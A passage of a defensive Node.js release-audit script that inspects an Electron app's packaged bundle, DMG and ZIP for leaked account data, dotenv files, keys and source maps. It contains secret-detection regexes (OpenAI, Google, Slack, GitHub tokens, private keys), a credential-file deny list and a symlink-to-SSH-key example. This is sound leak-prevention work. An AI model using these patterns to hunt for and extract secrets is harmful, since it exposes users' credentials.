/**
 * Audit the ACTUAL .app bundle that electron-builder produced — app.asar AND
 * every file shipped alongside it.
 *
 * WHY THIS EXISTS. `src/packagedfiles.contract.test.ts` reasons about
 * `package.json`'s `build.files` globs — the SPEC. Nothing anywhere looked at
 * the ARTIFACT. Every packaging guarantee in this repo therefore rested on a
 * model of electron-builder's glob semantics being right, in a project whose
 * own notes record that the last matching pattern wins and that iCloud
 * sprinkles " 2"-suffixed copies through the tree. A spec check cannot see a
 * file that arrives by a route the spec does not describe: an `extraResources`
 * entry, an `afterPack` hook writing into the bundle, a default electron-builder
 * inclusion, or a glob that behaves differently from the model.
 *
 * The release workflow builds the DMG and uploads it with nothing in between.
 * This runs in that gap.
 *
 * What it refuses to ship:
 *   - the account store (`db.json` and its recovery/conflict siblings) — the
 *     leak that reached `app.asar` once already;
 *   - any dotenv file, in any directory;
 *   - private keys, credential JSON, cloud service-account files;
 *   - the repo's own scratch surfaces (_gen, round<N>, handoffs) and .git;
 *   - source maps, which hand a reader the unminified server.
 *
 * It also asserts the package is NOT empty and DOES contain the files the app
 * needs to run — an audit that passes on an empty archive is not an audit.
 *
 * THE ARCHIVE IS NOT THE SHIPPED SURFACE. This file audited only `asar list`
 * for its first revision, and `extraResources: ["db.json"]` — one line in
 * `build` — lands the account store in `Contents/Resources/db.json`, NEXT TO
 * app.asar rather than inside it. `asar list` cannot see it, so all 31 checks
 * passed on a bundle carrying db.json and .env in the clear (reproduced, not
 * theorised). `extraFiles` does the same one level up in `Contents/`, and an
 * `afterPack` hook can write anywhere. What the user receives is the BUNDLE;
 * that is what gets audited, with the same rules applied to both listings.
 *
 * Usage: node src/desktop/audit-packaged-asar.cjs [path/to/app.asar]
 *        (with no argument, finds the one under dist-electron/)
 */
const { execFileSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const repo = path.join(__dirname, '..', '..');

// EVERY bundle, not the first one found. `mac.target` is ["dmg","zip"] and a
// --universal or --x64 build emits dist-electron/mac-arm64/ AND
// dist-electron/mac-x64/ side by side; this returned on the first hit, so a
// leak confined to the second slice was audited by nobody and the run still
// exited 0 (reproduced: _gen/b22-sr13-second-arch-unaudited.sh). Both slices
// are uploaded, so both are shipped.
function findAsars() {
  const base = path.join(repo, 'dist-electron');
  if (!fs.existsSync(base)) return [];
  const found = [];
  // One level down (dist-electron/mac-arm64/X.app) and at the top
  // (dist-electron/X.app), which is where a single-target build can put it.
  for (const dir of ['.', ...fs.readdirSync(base)]) {
    const parent = path.join(base, dir);
    if (!fs.existsSync(parent) || !fs.statSync(parent).isDirectory()) continue;
    for (const entry of fs.readdirSync(parent)) {
      if (!entry.endsWith('.app')) continue;
      const asar = path.join(parent, entry, 'Contents', 'Resources', 'app.asar');
      if (fs.existsSync(asar)) found.push(asar);
    }
  }
  return [...new Set(found)];
}

// Thrown instead of calling process.exit() from inside the try below: exit()
// terminates immediately and a `finally` never runs, so an early exit stranded
// the hdiutil mount and the NEXT invocation failed with "attach failed -
// Resource busy". The audit would then break the release purely by having been
// run before. Carry the exit code on the error and let the finally detach.
class AuditBail extends Error {
  constructor(code, message) { super(message); this.code = code; }
}

// THE SHIPPED ARTIFACT IS THE .dmg, NOT THE STAGING DIRECTORY.
//
// `findAsars` walks dist-electron/mac-*/X.app. The release workflow uploads
// `dist-electron/*.dmg`, which electron-builder produces as a SEPARATE artifact
// from the same staging dir. Nothing connected the two, so the audit's verdict
// was about a directory that is not what the user downloads.
//
// Reproduced: built a DMG whose app.asar carries
// `const K = "sk-proj-..."` while leaving dist-electron/mac-arm64/ pristine.
// The audit reported 140/140 GREEN and the DMG queued for upload held a live
// API key. Only the .dmg is uploaded today (the workflow's single
// `gcloud storage cp` of dmgs[0]) — `mac.target` also builds a .zip, which is
// audited here because it is produced from the same staging dir, is the
// natural artifact for a future auto-update feed, and costs one `ditto` to
// check. Auditing it is defence in depth, not a claim that it ships.
//
// Mount each .dmg read-only and unzip each .zip, then audit the app.asar
// inside exactly like any other — every rule in this file applies for free.
function mountedArtifactAsars(cleanups) {
  const base = path.join(repo, 'dist-electron');
  if (!fs.existsSync(base)) return [];
  const out = [];
  for (const entry of fs.readdirSync(base)) {
    const abs = path.join(base, entry);
    if (entry.endsWith('.dmg')) {
      const mnt = fs.mkdtempSync(path.join(require('os').tmpdir(), 'nash-audit-dmg-'));
      const r = require('child_process').spawnSync('hdiutil',
        ['attach', '-nobrowse', '-readonly', '-noverify', '-mountpoint', mnt, abs],
        { encoding: 'utf8' });
      if (r.status !== 0) {
        // hdiutil writes a DEPRECATION WARNING to stderr even on success, so a
        // naive slice(0, 200) of stderr showed the warning and truncated the
        // real cause to "hdiutil: attach fa" — a diagnostic that sent me
        // looking in the wrong place. Keep the lines that state the failure,
        // and always name the artifact and a next step.
        const lines = `${r.stderr || ''}${r.stdout || ''}`.split('\n')
          .map((l) => l.trim())
          .filter((l) => l && !/deprecated|Please use/i.test(l));
        throw new AuditBail(2, `audit-packaged-asar: could not mount ${entry}: `
          + `${lines.join(' / ').slice(0, 300) || `exit ${r.status}`}\n`
          + '  Refusing to report success on an artifact that is uploaded but could not be opened. '
          + '("Resource busy" usually means a previous run left it mounted: check `mount | grep '
          + 'nash-audit` and `hdiutil detach` it.)');
      }
      cleanups.push(() => {
        require('child_process').spawnSync('hdiutil', ['detach', mnt, '-force'], { stdio: 'ignore' });
        fs.rmSync(mnt, { recursive: true, force: true });
      });
      for (const e of fs.readdirSync(mnt)) {
        if (!e.endsWith('.app')) continue;
        const asar = path.join(mnt, e, 'Contents', 'Resources', 'app.asar');
        if (fs.existsSync(asar)) out.push(asar);
      }
    } else if (entry.endsWith('.zip')) {
      const dir = fs.mkdtempSync(path.join(require('os').tmpdir(), 'nash-audit-zip-'));
      const r = require('child_process').spawnSync('ditto',
        ['-x', '-k', abs, dir], { encoding: 'utf8' });
      if (r.status !== 0) {
        throw new AuditBail(2, `audit-packaged-asar: could not unpack ${entry}: `
          + `${(r.stderr || '').trim().slice(0, 200)}.`);
      }
      cleanups.push(() => fs.rmSync(dir, { recursive: true, force: true }));
      for (const e of fs.readdirSync(dir)) {
        if (!e.endsWith('.app')) continue;
        const asar = path.join(dir, e, 'Contents', 'Resources', 'app.asar');
        if (fs.existsSync(asar)) out.push(asar);
      }
    }
  }
  return out;
}

if (!process.argv[2]) {
  const cleanups = [];
  // `process.exit()` terminates IMMEDIATELY — a `finally` block does not run.
  // Every exit path below used to sit inside the try, so each invocation leaked
  // its hdiutil mount and the NEXT run failed with "hdiutil: attach failed -
  // Resource busy": the audit broke the release by having been run once. Record
  // the code, let the finally detach, and exit after it.
  const runCleanups = () => { for (const fn of cleanups) { try { fn(); } catch { /* best effort */ } } };
  let staged = [];
  let shipped = [];
  let exitCode = 0;
  try {
    staged = findAsars();
    shipped = mountedArtifactAsars(cleanups);
    const all = [...staged, ...shipped];
    if (all.length === 0) {
      throw new AuditBail(2, 'audit-packaged-asar: no app.asar found. Run '
        + '`npx electron-builder --dir` first, or pass the path. Refusing to report success '
        + 'without an artifact to audit.');
    }
    // Re-run for each bundle rather than auditing one and hoping the rest match.
    // No `break` on failure: the point of an audit is the full list of leaks.
    let worst = 0;
    for (const p of all) {
      const r = require('child_process').spawnSync(process.execPath, [__filename, p],
        { stdio: 'inherit' });
      worst = Math.max(worst, r.status === null ? 1 : r.status);
    }
    // A `--dir` build produces no .dmg/.zip and that is a legitimate local run,
    // but a release build must never audit the staging dir alone: that is the
    // exact shape of the hole above. `AUDIT_REQUIRE_SHIPPED=1` in the release
    // workflow makes the absence of a shipped artifact a failure rather than a
    // quieter pass.
    if (process.env.AUDIT_REQUIRE_SHIPPED === '1' && shipped.length === 0) {
      throw new AuditBail(2, 'audit-packaged-asar: AUDIT_REQUIRE_SHIPPED=1 but no .dmg/.zip was '
        + 'found in dist-electron/. The release uploads those artifacts; auditing only the '
        + 'staging directory says nothing about what ships.');
    }
    if (all.length > 1) {
      console.log(`audit-packaged-asar: audited ${all.length} bundles `
        + `(${staged.length} staged, ${shipped.length} inside shipped artifacts).`);
    }
    exitCode = worst;
  } catch (e) {
    if (e instanceof AuditBail) { console.error(e.message); exitCode = e.code; } else { throw e; }
  } finally {
    runCleanups();
  }
  // AFTER the finally, so every mount is detached before the process dies.
  process.exit(exitCode);
}

// RESOLVED, because bundleRoot is derived from it and the symlink-escape check
// compares that against a path.resolve()d target — i.e. an absolute one. Given
// a RELATIVE argv the two were never comparable and all 14 of Electron's own
// framework version stamps read as escaping the bundle. A check that fires on
// a correct bundle is worse than no check: it gets switched off, and then its
// false-positive shape is exactly where a real escaping link would hide.
const asarPath = path.resolve(process.argv[2]);
if (!fs.existsSync(asarPath)) {
  console.error(`audit-packaged-asar: ${asarPath} does not exist. Refusing to report success `
    + 'without an artifact to audit.');
  process.exit(2);
}

const listing = execFileSync('npx', ['asar', 'list', asarPath], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 })
  .split('\n').map((l) => l.trim()).filter(Boolean);
// The same library `npx asar` wraps, for the per-file reads below. Resolved from
// the repo so the audit uses the version this build actually packaged with.
const asarLib = require(require.resolve('@electron/asar', { paths: [repo] }));

// Everything shipped OUTSIDE the archive. app.asar lives at
// <App>.app/Contents/Resources/app.asar, so the bundle root is two levels up.
// Walked with fs rather than `find` so a filename with a newline in it cannot
// split into two harmless-looking lines.
const bundleRoot = path.dirname(path.dirname(path.dirname(asarPath)));
const isBundle = bundleRoot.endsWith('.app') && fs.existsSync(path.join(bundleRoot, 'Contents'));
// Symlink targets, collected while walking. A link is a file whose CONTENT is
// chosen at open time on the user's machine, so an allowlisted path can still
// be a window onto anything: `app.asar.unpacked/node_modules/harmless.dat ->
// /Users/x/.ssh/id_rsa` sits inside the dependency carve-out and passed every
// rule. Auditing the path alone cannot see that.
const symlinks = [];
// Permission bits and link counts, gathered in the same pass — the walk already
// stats every entry, so these cost nothing and answer questions a path list
// cannot. A DMG preserves modes, so what is measured here is what the user
// mounts.
const worldWritable = [];
const setuidOrSetgid = [];
const hardLinked = [];
// How many files the walk actually stat()ed. The three lists above are all
// expected to be EMPTY, so without this a collector that never ran is
// indistinguishable from a clean bundle.
let checkedModes = 0;
function walk(dir, prefix, acc) {
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const rel = `${prefix}/${entry.name}`;
    const abs = path.join(dir, entry.name);
    acc.push(rel);
    if (entry.isSymbolicLink()) {
      try { symlinks.push([rel, fs.readlinkSync(abs)]); } catch { /* raced */ }
      continue; // never descend: a link out of the bundle would walk the disk
    }
    if (entry.isFile()) {
      try {
        const st = fs.lstatSync(abs);
        checkedModes++;
        if (st.mode & 0o002) worldWritable.push(rel);
        if (st.mode & 0o6000) setuidOrSetgid.push(rel);
        // A hard link shares one inode with a file elsewhere on disk: same
        // escape as a symlink, no link to read.
        if (st.nlink > 1) hardLinked.push(rel);
      } catch { /* raced */ }
    }
    if (entry.isDirectory()) walk(abs, rel, acc);
  }
  return acc;
}
// Only the ARCHIVE FILE is excluded — its contents are audited through
// `listing` above, so re-reading them here would duplicate findings.
//
// This was `!p.startsWith('/Contents/Resources/app.asar')`, a prefix that also
// swallowed the SIBLING directory app.asar.unpacked/. That sidecar is a real
// shipped surface (electron-builder puts native binaries there, and an
// afterPack hook can write anything into it) and it is NOT in `asar list`, so
// the exclusion made it invisible to both halves at once: a db.json planted
// there passed all 51 checks. Found by the 9router reviewer; the comment I
// replaced asserted the sidecar was covered, which is exactly the kind of
// claim that needs a mutation rather than a sentence.
const bundleListing = isBundle
  ? walk(bundleRoot, '', []).filter((p) => p !== '/Contents/Resources/app.asar')
  : [];

let checks = 0;
const failures = [];
function ok(cond, msg) { checks++; if (!cond) failures.push(msg); }

// Vendored dependencies are a different question with different answers
// (`--packages=external` means the app REQUIRES node_modules at runtime, so it
// cannot be pruned — recorded as a non-finding, not an oversight). These rules
// are about this repo's own files.
// Note the `p !== '/node_modules'`: asar lists the DIRECTORY entry itself as
// well as its contents, and filtering only on the trailing slash left that one
// bare entry in `ours` — where the allowlist below correctly rejected it.
const ours = listing.filter((p) => p !== '/node_modules' && !p.startsWith('/node_modules/'));

ok(listing.length > 1000,
  `the asar holds only ${listing.length} entries. An empty or near-empty archive would make every `
  + 'exclusion below pass by having nothing to exclude.');
ok(isBundle,
  `${asarPath} is not inside a .app bundle, so everything electron-builder ships ALONGSIDE the `
  + 'archive (extraResources, extraFiles, afterPack output) went unaudited. Point this at the '
  + 'app.asar under dist-electron/<arch>/<App>.app/Contents/Resources/.');
ok(!isBundle || bundleListing.length > 50,
  `the bundle walk found only ${bundleListing.length} paths outside the archive, which is too few `
  + 'for an Electron app — the walk is broken and every rule below would pass by seeing nothing.');
ok(!isBundle || bundleListing.some((p) => /^\/Contents\/MacOS\/[^/]+$/.test(p)),
  'CONTROL: the bundle walk did not find the app executable at /Contents/MacOS/, so it is not '
  + 'walking the bundle it claims to walk.');
for (const required of ['/electron-main.cjs', '/electron-preload.cjs', '/dist/server.cjs', '/dist/index.html']) {
  ok(listing.includes(required),
    `CONTROL: ${required} is missing from the package — the app cannot run. An audit that passes `
    + 'on a broken archive is not an audit.');
}

// THE SHIPPED index.html MUST STILL CARRY THE ANALYTICS GATE.
//
// The gate in index.html is this app's documented primary egress guard
// (RED-DESKTOP-21/002: without it www.google-analytics.com is the packaged
// renderer's one non-loopback host, measured 39/40 idle snapshots before vs
// 7/40 after). `electronmenu.contract.test.ts` executes it under four
// identities with controls — but it reads the REPO's index.html. Nothing
// checked the copy actually inside app.asar, which is the file the user runs.
// The two can differ: index.html is an input to the vite build, so a plugin,
// an html transform or a stale dist/ all produce a package whose gate is gone
// while every source-level check stays green. Same blind spot Info.plist had,
// one layer further in — a path listing cannot see contents.
//
// Read the file OUT of the archive and assert both halves of the gate.
//
// `gateRulesRan` is asserted below, OUTSIDE this block. Everything in here is
// conditional — on the entry being listed, on the extract succeeding, on `html`
// being non-empty — and each of those silently skips the gate rules while the
// audit still exits 0, just with four fewer checks. Mutation-tested: emptying
// `html` and making the condition `if (false)` both left the run GREEN at 103.
// A skipped check and a passed check must not look the same from outside.
let gateRulesRan = false;
if (listing.includes('/dist/index.html')) {
  // `asar extract-file` writes basename(file) into the CWD, so it gets a
  // private directory: extracting into os.tmpdir() would collide with any other
  // index.html there and this check would then audit someone else's file.
  const outDir = fs.mkdtempSync(path.join(require('os').tmpdir(), 'nash-audit-html-'));
  let html = '';
  try {
    execFileSync('npx', ['asar', 'extract-file', asarPath, 'dist/index.html'],
      { cwd: outDir, maxBuffer: 16 * 1024 * 1024 });
    html = fs.readFileSync(path.join(outDir, 'index.html'), 'utf8');
  } catch (e) {
    ok(false, `could not read dist/index.html out of the archive (${String(e.message).slice(0, 120)}). `
      + 'The gate rules below never ran.');
  } finally {
    fs.rmSync(outDir, { recursive: true, force: true });
  }
  if (html) {
    ok(/navigator\.userAgent/.test(html) && /indexOf\(['"]electron['"]\)/i.test(html),
      'the PACKAGED dist/index.html has no Electron user-agent check around analytics. This is the '
      + "app's primary egress guard: without it the packaged renderer loads googletagmanager and "
      + 'www.google-analytics.com becomes its one non-loopback host (RED-DESKTOP-21/002). The '
      + 'source-level test in electronmenu.contract.test.ts reads the REPO file and cannot see this.');
    ok(/nashDesktop/.test(html),
      'the PACKAGED dist/index.html does not test for the preload bridge (window.nashDesktop). That '
      + 'is the second, independent half of the gate — with only the UA test, a UA override '
      + 're-enables analytics in the packaged app.');
    // A STATIC tag would load before any gate could run.
    ok(!/<script[^>]+src=["'][^"']*googletagmanager/i.test(html),
      'the PACKAGED dist/index.html loads googletagmanager from a STATIC <script src>, which runs '
      + 'before any gate can suppress it. The tag must be inserted by the gated script only.');
    // CONTROL: prove we are reading the real page and not an empty/placeholder
    // file, which would satisfy all three rules above by containing nothing.
    ok(/<div id="root"><\/div>/.test(html) && /<script[^>]+src=["']\.?\/assets\//.test(html),
      `the packaged dist/index.html (${html.length} bytes) does not look like the built page — no `
      + '#root div or no hashed asset script. The gate rules above all pass on an empty file.');
    gateRulesRan = true;
  }
}
// SECRETS BAKED INTO THE SHIPPED TEXT.
//
// Every FORBIDDEN rule below is a FILENAME pattern. They stop a `.env` from
// being packaged; they cannot see a credential inlined into a file that
// legitimately belongs in the archive. Reproduced end to end: put
//   const OPENAI_API_KEY = "sk-proj-...";
// at the top of dist/server.cjs and run the real `electron-builder --dir` —
// the bundle audits 110/110 GREEN with a valid signature and a matching
// integrity hash, because nothing tampered with it AFTER packaging. The seal
// answers "was this changed?", never "should this have been here?". esbuild
// `define`, a committed fallback, a debug constant and a bad merge all produce
// exactly this, and the DMG is public.
//
// Scanned over the files whose text a human never re-reads. MEASURED on the
// real shipping bundle before being asserted: zero matches across all four
// (1.5MB of bundled server included), and all four planted leaks caught —
// so this is not a predicate tuned against its own output.
const SECRET_PATTERNS = [
  [/sk-[A-Za-z0-9_-]{24,}/, 'an OpenAI-style API key'],
  [/AIza[A-Za-z0-9_-]{30,}/, 'a Google API key'],
  [/-----BEGIN (?:RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----/, 'a private key'],
  [/xox[baprs]-[A-Za-z0-9-]{10,}/, 'a Slack token'],
  [/gh[pousr]_[A-Za-z0-9]{30,}/, 'a GitHub token'],
  // The credential NAMES this project actually holds (.env), assigned a
  // non-empty literal. A name alone is fine — server.ts reads process.env.
  [/\b(?:SMTP_PASS|SMTP_USER|GEMINI_API_KEY|AZURE_FOUNDRY_API_KEY|AGENT_ROUTER_API_KEY|KAGGLE_API_TOKEN|AWS_BEARER_TOKEN_BEDROCK|OPEN_ROUTER_API_KEY)\s*[:=]\s*["'"'"'][^"'"'"']{8,}["'"'"']/,
    "one of this project's own credentials, inlined with a literal value"],
];
let secretScanned = 0;
let secretChecksRun = 0;
// DERIVED FROM THE ARCHIVE, not hand-listed. The four names here used to be
// hardcoded, with a comment calling them "the shipped text surface" — measurably
// false: /dist/assets/index-*.js is the RENDERER bundle, and Vite inlines any
// referenced `import.meta.env.VITE_*` value into it verbatim. Reproduced end to
// end: referenced a VITE_LEAK_PROBE holding an `sk-…` key, built, packaged, and
// the audit reported 290/290 with the key sitting in the .dmg's app.asar.
// So: every text-bearing file the app ships, whatever it is called. Fonts and
// images are excluded by extension — they are the only binaries here, and a
// hashed filename is exactly what a hand-written list cannot keep up with.
const SECRET_SKIP_RE = /\.(woff2?|ttf|otf|eot|png|jpe?g|gif|ico|icns|webp|avif|mp4|webm|wasm|zip|gz)$/i;
// `ours`, not the whole listing: node_modules is third-party code nobody here
// writes a credential into, and scanning 13k files takes the audit from seconds
// to minutes. What this exists to cover is OUR build output.
const SECRET_SCAN_FILES = ours
  .filter((p) => !SECRET_SKIP_RE.test(p) && /\.[A-Za-z0-9]+$/.test(p))
  .map((p) => p.replace(/^\//, ''))
  .sort();
for (const rel of SECRET_SCAN_FILES) {
  if (!listing.includes(`/${rel}`)) continue;
  try {
    // The Node API, not `npx asar` per file: the list is derived now (dozens of
    // files, not four) and a subprocess each made the audit take minutes. Same
    // library the CLI wraps. Also avoids the extract-file-writes-basename trap —
    // two files named index.js in different directories cannot collide here.
    const text = asarLib.extractFile(asarPath, rel).toString('utf8');
    secretScanned += text.length;
    for (const [re, what] of SECRET_PATTERNS) {
      const m = re.exec(text);
      secretChecksRun++;
      ok(!m,
        `the packaged ${rel} contains ${what} (${String(m && m[0]).slice(0, 12)}…). A filename rule `
        + 'cannot catch this: the file belongs in the archive and only its CONTENT is wrong. The '
        + 'signature and the integrity hash both pass, because nothing tampered with the bundle — '
        + 'the secret was built in. This DMG is downloaded from a public URL.');
    }
  } catch (e) {
    ok(false, `could not scan the packaged ${rel} for secrets (${String(e.message).slice(0, 120)}).`);
  }
}
// The rules above pass on an empty read, which is also what a broken extract
// gives. dist/server.cjs alone is ~1.5MB, so a small total means the scan saw
// almost nothing and its clean result means nothing either.
ok(secretScanned > 500000,
  `the secret scan read only ${secretScanned} bytes out of the archive. dist/server.cjs alone is `
  + 'over a megabyte, so the scan is not reading what it claims to read.');
// …and the WORK done, not just the bytes read. Shrinking SECRET_PATTERNS to []
// or the file list to one entry left the audit GREEN at a lower check count —
// a scan that silently covers less is indistinguishable from a clean result.
// Every file present in the archive must have met every pattern.
// Both counts are LITERAL, not derived from the lists being checked. The first
// spelling computed its own expectation from SECRET_SCAN_FILES, so cutting that
// list to one entry changed both sides and the check passed — a check that
// cannot fail for the reason it states. These four files are the shipped text
// surface; if one is legitimately added, update the number here on purpose.
for (const f of SECRET_SCAN_FILES) {
  ok(listing.includes(`/${f}`),
    `${f} is not in the archive, so the secret scan skipped it. Every file in SECRET_SCAN_FILES is `
    + 'one the app needs; a missing one means the scan covered less than it claims.');
}
// The file list is derived now, so a count taken from it would be self-derived
// (the SR-35 trap: both sides move together and the check cannot fail). Anchor
// on the files that must be in ANY build of this app, named literally, plus the
// renderer bundle matched by shape because its name is content-hashed.
const MUST_SCAN = ['dist/server.cjs', 'dist/index.html', 'electron-main.cjs', 'electron-preload.cjs'];
for (const f of MUST_SCAN) {
  ok(SECRET_SCAN_FILES.includes(f),
    `${f} is not in the derived secret-scan list. The derivation dropped a file the app certainly `
    + 'ships, so it is filtering too hard and the clean result covers less than it claims.');
}
ok(SECRET_SCAN_FILES.some((f) => /^dist\/assets\/index-[^/]+\.js$/.test(f)),
  'the derived secret-scan list contains no dist/assets/index-*.js. That is the RENDERER bundle, '
  + 'the file Vite inlines import.meta.env values into — the one this derivation exists to cover.');
ok(SECRET_PATTERNS.length >= 6 && SECRET_SCAN_FILES.length >= 8
  && secretChecksRun === SECRET_SCAN_FILES.length * SECRET_PATTERNS.length,
  `the secret scan ran ${secretChecksRun} checks over ${SECRET_SCAN_FILES.length} files x `
  + `${SECRET_PATTERNS.length} patterns; every listed file must have met every pattern, over at `
  + 'least 8 files and 6 patterns. A file that failed to extract lowers this and still exits 0.');

// THE PACKAGED electron-main.cjs / electron-preload.cjs MUST BE THE AUDITED ONES.
//
// Every behavioural guarantee in src/integration/electron-behavior.test.mjs is
// measured by loading the REPO's copies of these two files. That is only
// meaningful if the packaged copies are the same bytes — electron-builder
// copies them unbundled today (verified: byte-identical), but `build.files` is
// a glob list and dist/ is a build output, so a transform, a stale artifact or
// a second copy shadowing them would leave all 440 behavioural checks green
// while the shipped app runs different code. Hash, don't hope.
for (const rel of ['electron-main.cjs', 'electron-preload.cjs']) {
  const outDir = fs.mkdtempSync(path.join(require('os').tmpdir(), 'nash-audit-src-'));
  try {
    execFileSync('npx', ['asar', 'extract-file', asarPath, rel],
      { cwd: outDir, maxBuffer: 16 * 1024 * 1024 });
    const packed = fs.readFileSync(path.join(outDir, rel));
    const source = fs.readFileSync(path.join(repo, rel));
    ok(packed.equals(source),
      `the packaged ${rel} (${packed.length} bytes) differs from the repo's (${source.length}). `
      + 'Every behavioural check in src/integration/electron-behavior.test.mjs loads the REPO copy '
      + '— permissions, the context-bridge surface, egress, openExternal — so a packaged copy that '
      + 'differs means those 440 checks measured a file the user never runs.');
  } catch (e) {
    ok(false, `could not compare the packaged ${rel} against the repo copy `
      + `(${String(e.message).slice(0, 120)}).`);
  } finally {
    fs.rmSync(outDir, { recursive: true, force: true });
  }
}

ok(gateRulesRan,
  'the packaged-index.html gate rules never ran: dist/index.html was not listed in the archive, '
  + 'could not be extracted, or read as empty. Every one of those paths exits 0 with the app\'s '
  + 'primary egress guard unchecked, which is indistinguishable from a clean result.');

const FORBIDDEN = [
  [/(^|\/)db\.json($| |\.)/i, 'the account store: usernames, emails and bcrypt password hashes. '
    + 'This exact file reached app.asar once already. The " " and "." alternatives catch the '
    + 'iCloud conflict copy ("db.json 2") and the recovery siblings (db.json.corrupt-*).'],
  [/(^|\/)\.env/i, 'a dotenv file — API keys, SMTP credentials, the session secret.'],
  [/\.(pem|key|p12|pfx|keystore|jks)$/i, 'a private key or keystore.'],
  [/(^|\/)(gcp|gcloud|service-account|credentials|client_secret)[^/]*\.json$/i,
    'a cloud credential file.'],
  [/(^|\/)\.git($|\/)/i, 'the git directory — every commit, branch and stashed secret.'],
  [/(^|\/)(_gen|round\d+|handoffs|\.claude)($|\/)/i,
    "the repo's scratch surface: agent probes, notes and session handoffs."],
  [/\.map$/i, 'a source map, which hands a reader the unminified server source.'],
  [/(^|\/)CLAUDE(-[A-Z-]+)?\.md$/i, 'internal engineering notes.'],
];
for (const [re, why] of FORBIDDEN) {
  const hits = ours.filter((p) => re.test(p));
  ok(hits.length === 0,
    `the package contains ${JSON.stringify(hits.slice(0, 5))} (${hits.length} total): ${why}`);
  // Same rule, outside the archive. A secret shipped at
  // Contents/Resources/db.json is no less readable than one inside app.asar —
  // it is more so, since it needs no unpacking. Verified against the real
  // bundle: every rule matches nothing there, so this cannot fire falsely.
  const bundleHits = bundleListing.filter((p) => re.test(p));
  ok(bundleHits.length === 0,
    `the .app bundle ships ${JSON.stringify(bundleHits.slice(0, 5))} (${bundleHits.length} total) `
    + `OUTSIDE app.asar: ${why}`);
}

// THE ALLOWLIST — the check that actually decides.
//
// Everything above is a denylist, and a denylist of secret-shaped filenames
// cannot be finished. My own self-review listed eighteen shapes that walked
// straight past it: /database.json, /users.json, /secrets.json, /id_rsa,
// /.npmrc, /.ssh/id_ed25519, /.aws/credentials, /.git-credentials,
// /firebase-adminsdk.json, /auth-secret, /token.txt, /server.ts, /.DS_Store…
// Adding eighteen more rules would leave the nineteenth.
//
// This app's own packaged surface is four files and one directory. Enumerating
// what MAY be there is both shorter and total: anything else fails, whatever it
// is called. The rules above are kept because their messages say WHY a
// particular shape is dangerous, which "not on the allowlist" cannot.
const ALLOWED_TOP_LEVEL = new Set([
  '/electron-main.cjs', '/electron-preload.cjs', '/package.json',
]);
const unexpected = ours.filter((p) => {
  if (ALLOWED_TOP_LEVEL.has(p)) return false;
  // The built frontend + server bundle. `dist/` is produced by `npm run build`
  // from sources in this repo, so its contents are ours by construction — but a
  // source map or a stray .env inside it still fails the rules above.
  if (p === '/dist' || p.startsWith('/dist/')) return false;
  return true;
});
ok(unexpected.length === 0,
  `the package contains ${JSON.stringify(unexpected.slice(0, 10))} (${unexpected.length} total), `
  + `which is outside the app's own surface: ${[...ALLOWED_TOP_LEVEL].join(', ')} and dist/. This `
  + 'is an ALLOWLIST on purpose — a denylist of secret-shaped filenames cannot be completed, and '
  + 'eighteen shapes were found walking past the rules above. If you are adding a file the app '
  + 'genuinely needs at runtime, add it here deliberately.');

// THE SAME ALLOWLIST, OUTSIDE THE ARCHIVE — and the one that would have caught
// the extraResources leak whatever the file had been called.
//
// Electron's own bundle layout is fixed and none of it comes from this repo, so
// the shipped-alongside surface can be enumerated exactly: the macOS skeleton,
// the Electron framework and helpers, the locale packs, the icon, and the
// archive. `extraResources`/`extraFiles`/`afterPack` have no legitimate use in
// this project — the app needs nothing outside app.asar — so ANY path here that
// is not Electron's own is a leak, named db.json or not.
// The app's own name, so this file works unchanged on the review mirror (where
// the product is renamed) instead of hardcoding one bundle's executable.
const appExe = path.basename(bundleRoot, '.app');
const esc = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const BUNDLE_ALLOWED = [
  /^\/Contents$/,
  /^\/Contents\/(Info\.plist|PkgInfo)$/,
  /^\/Contents\/_CodeSignature(\/CodeResources)?$/,
  // Only the launcher. `extraFiles` with an explicit `to:` can write anywhere
  // in the bundle, so "the MacOS directory" is not a safe unit to wave through.
  new RegExp(`^/Contents/MacOS(/${esc(appExe)})?$`),
  // Electron's frameworks and helper apps, by SHAPE — the tree inside them is
  // Electron's and changes with its version, but a file dropped directly into
  // Frameworks/ is not part of any framework. The contents of those trees are
  // NOT enumerable here (they move every Electron release), so the size check
  // below is what guards them; see BUNDLE_FRAMEWORK_BASELINE.
  /^\/Contents\/Frameworks(\/[^/]+\.(framework|app)(\/.*)?)?$/,
  /^\/Contents\/Resources$/,
  // Empty locale stubs. Verified empty in the built bundle, so there is no
  // reason to allow anything INSIDE them — that would be a place to hide a file.
  /^\/Contents\/Resources\/[A-Za-z0-9_]+\.lproj$/,
  /^\/Contents\/Resources\/(icon\.icns|electron\.icns)$/,
  // app.asar.unpacked — electron-builder's sidecar for files that must exist
  // on disk rather than inside the archive (native binaries it cannot load
  // from an asar). Only node_modules, matching the carve-out `ours` already
  // applies to the archive itself: vendored dependencies are a separate
  // question, this repo's own files are not allowed here either way. A
  // db.json written straight into app.asar.unpacked/ fails.
  /^\/Contents\/Resources\/app\.asar\.unpacked$/,
  /^\/Contents\/Resources\/app\.asar\.unpacked\/node_modules(\/.*)?$/,
];
const bundleUnexpected = bundleListing.filter((p) => !BUNDLE_ALLOWED.some((re) => re.test(p)));
ok(bundleUnexpected.length === 0,
  `the .app bundle ships ${JSON.stringify(bundleUnexpected.slice(0, 10))} `
  + `(${bundleUnexpected.length} total) outside app.asar. Nothing in this project belongs there: `
  + 'the app loads everything from the archive, so a file here arrived via extraResources, '
  + 'extraFiles or an afterPack hook. `extraResources: ["db.json"]` puts the account store in '
  + 'Contents/Resources/db.json, which `asar list` cannot see and this audit reported as 31 '
  + 'checks passed before this rule existed.');

// THE FRAMEWORK TREES, WHICH THE ALLOWLIST ABOVE WAVES THROUGH WHOLESALE.
//
// Their contents belong to Electron and are reshuffled by every release, so
// they cannot be enumerated the way this app's own four files can. But "not
// enumerable" is not "trusted": afterPack runs after these are laid down and
// can write anywhere in them. The denylist catches a file CALLED db.json or
// .env there; the 9router reviewer showed `settings.dat` deep inside
// Electron Framework.framework walks straight past all 51 checks.
//
// So pin the COUNT, exactly. Nothing this project does adds a path to a
// framework, so the only legitimate way this number changes is an Electron
// upgrade — a deliberate act, in a commit that also changes package.json, and
// the right moment to re-read this line. A tolerance band was the first
// spelling and it is the wrong shape: "+/-12" is a licence to hide up to
